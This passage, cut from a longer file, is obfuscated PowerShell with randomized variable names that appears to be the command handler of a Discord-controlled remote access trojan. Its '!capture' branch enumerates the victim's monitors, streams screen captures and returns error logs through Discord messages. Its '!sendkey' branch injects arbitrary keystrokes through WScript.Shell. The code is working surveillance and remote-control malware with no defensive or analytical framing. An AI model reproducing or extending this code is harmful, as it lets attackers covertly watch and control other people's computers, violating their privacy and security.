                if ($VvYns -eq "err" -or $VvYns -eq "log") {
                    if (-not (Test-Path -LiteralPath $script:captureErrFile)) {
                        Send-DiscordMessage -Content "No err log" -ReplyToId $msgId
                        return
                    }
                    $nVc3 = Get-Content -LiteralPath $script:captureErrFile -Tail 50 -Encoding UTF8
                    Send-CodeBlock -Title "capture err log" -Body ($nVc3 -join "`n") -ReplyToId $msgId
                    return
                }
                if ($VvYns -eq "list") {
                    Add-Type -AssemblyName System.Windows.Forms
                    $YtRs2 = [System.Windows.Forms.Screen]::AllScreens
                    $GcHR6 = @("**0** = ALL (virtual screen)")
                    for ($RaOc9j = 0; $RaOc9j -lt $YtRs2.Count; $RaOc9j++) {
                        $bndCZBqZ = $YtRs2[$RaOc9j]
                        $L3hThrW = if ($bndCZBqZ.Primary) { " [PRIMARY]" } else { "" }
                        $GcHR6 += "**$($RaOc9j+1)** : $($bndCZBqZ.Bounds.Width)x$($bndCZBqZ.Bounds.Height) @ ($($bndCZBqZ.Bounds.X),$($bndCZBqZ.Bounds.Y))$L3hThrW"
                    }
                    Send-CodeBlock -Title "Monitors" -Body ($GcHR6 -join "`n") -ReplyToId $msgId
                    return
                }
                $kgICGVXv = if ($BktMd) { $BktMd.Trim() -split '\s+' } else { @() }
                $fps = 1; $RAxUHf = 60; $Ib7V = 0; $vjrq = 0
                try { if ($kgICGVXv.Count -ge 1 -and $kgICGVXv[0]) { $fps = [int]$kgICGVXv[0] } } catch { }
                try { if ($kgICGVXv.Count -ge 2 -and $kgICGVXv[1]) { $RAxUHf   = [int]$kgICGVXv[1] } } catch { }
                try { if ($kgICGVXv.Count -ge 3 -and $kgICGVXv[2]) { $Ib7V = [int]$kgICGVXv[2] } } catch { }
                try { if ($kgICGVXv.Count -ge 4 -and $kgICGVXv[3]) { $vjrq = [int]$kgICGVXv[3] } } catch { }
                if ($fps -lt 1) { $fps = 1 }; if ($fps -gt 2) { $fps = 2 }
                if ($RAxUHf -lt 20) { $RAxUHf = 20 }; if ($RAxUHf -gt 90) { $RAxUHf = 90 }
                if ($Ib7V -lt 0) { $Ib7V = 0 }
                if ($Ib7V -gt 0 -and $Ib7V -lt 5) { $Ib7V = 5 }
                $qUNra = Start-CaptureStream -Fps $fps -Quality $RAxUHf -MaxSeconds $Ib7V -Monitor $vjrq
                Send-DiscordMessage -Content "$qUNra`n``!capture stop`` | ``!capture status`` | ``!capture err`` | ``!capture list``" -ReplyToId $msgId
                return
            }

            "sendkey" {
                if (-not $BktMd) { Send-DiscordMessage -Content "usage: !sendkey <text>" -ReplyToId $msgId; return }
                $IvCZ79H = $BktMd
                $fjeae = $IvCZ79H -replace "'", "''"
                $bdUegpN = "`$w = New-Object -ComObject WScript.Shell; `$w.SendKeys('$fjeae')"
                Invoke-PSCommand -Command $bdUegpN | Out-Null
                Send-DiscordMessage -Content "Sent: ``$IvCZ79H``" -ReplyToId $msgId
                return
